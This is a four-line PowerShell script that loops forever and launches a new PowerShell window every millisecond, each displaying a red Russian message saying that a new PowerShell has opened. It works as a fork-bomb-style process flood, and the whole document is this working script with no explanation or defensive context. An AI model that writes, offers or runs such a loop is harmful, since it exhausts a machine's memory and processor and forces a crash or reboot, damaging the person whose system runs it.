while ($true) {
    Start-Process powershell.exe -ArgumentList "-NoExit", "-Command", "Write-Host 'Новый PowerShell открыт' -ForegroundColor Red"
    Start-Sleep -Milliseconds 1
}
